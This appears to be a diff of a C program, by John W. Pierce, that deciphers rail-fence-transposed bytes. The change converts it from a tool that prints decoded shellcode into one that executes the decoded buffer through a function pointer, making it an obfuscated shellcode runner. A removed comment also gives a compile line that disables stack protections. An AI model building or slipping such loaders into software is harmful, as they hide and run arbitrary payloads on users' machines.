@@ -1,26 +1,7 @@
-/* rf-decode.c
+/* rf-shellcode.c
 
-Decodes bytecodes enciphered using the rail fence method
-then runs the code.  Use rf-encode.c to encipher the bytecodes
-to insert as shellcode below.  What's there right now is shellcode
-to execute an execve from the stack.
-
-compile: gcc -fno-stack-protector -z execstack rf-decode.c -o rf-decode
-
-Transposition cipher as described in Cryptology written by
-Albrecht Beutelspacher and published by the Mathematical
-Association of America, ISBN 0-88385-504-6
-
-Implemented by John Pierce, CISSP on May 10, 2013, remsanattexascarverdotcom
-
-
-Method:  Best shown by example.  Encipher the word 'fredericksburg' with
-a key of 4
-
-	f     i     r		Result = l1+l2+l3+l4 = firrrcugeekbds
-	 r   r c   u g
-	  e e   k b
-	   d	 s
+Decodes characters using the rail fence method, a transposition cipher
+then executes the code.
 
 This program was written by John W. Pierce, CISSP.  I enter it into
 the public domain.  You are free to use and/or redistribute it without 
@@ -75,16 +56,14 @@ int	main() {
 				buf[k] = inp[p];
 		} while (k<l);
 	}
-	// Now print the results
-	printf("\n\n");
+	// Need to copy the buffer over the original string
+	// so we can clean up, even when no return from shellcode
 	for (p=0; p<l; p++)
-		printf("\\x%02x",buf[p]);
-	printf("\n\n");
-	for (p=0; p<l; p++)
-		printf("0x%02x,", buf[p]);
-	printf("\n\n");
-	// and clean up
+		inp[p] = buf[p];
 	free(buf);
+	// Now run the code
+	int (*ret)() = (int(*))inp;
+	ret();
 	exit(0);
 }
 		
